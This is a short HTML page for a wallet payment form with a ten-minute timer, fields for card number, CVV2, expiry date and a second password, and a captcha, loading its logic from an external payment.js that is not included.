<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Secure Payment</title>
    <link rel="stylesheet" href="payment.css">
</head>

<body>

<div class="container">

    <h2>Secure Wallet Payment</h2>

    <div class="timer">
        Time remaining: <span id="time">10:00</span>
    </div>

    <p id="message"></p>

    <form id="paymentForm">

        <input id="cardNumber" type="text" placeholder="Card Number" required>

        <input id="cvv2" type="text" placeholder="CVV2" required>

        <input id="expireDate" type="text" placeholder="Expiry Date (MM/YY)" required>

        <input id="password" type="password" placeholder="Second Password" required>


        <div class="captcha-box">

            <img id="captchaImage" alt="captcha">

            <input id="captchaInput" type="text" placeholder="Enter captcha" required>

        </div>

        <button type="submit">Pay</button>

    </form>

</div>

<script src="payment.js"></script>

</body>
</html>
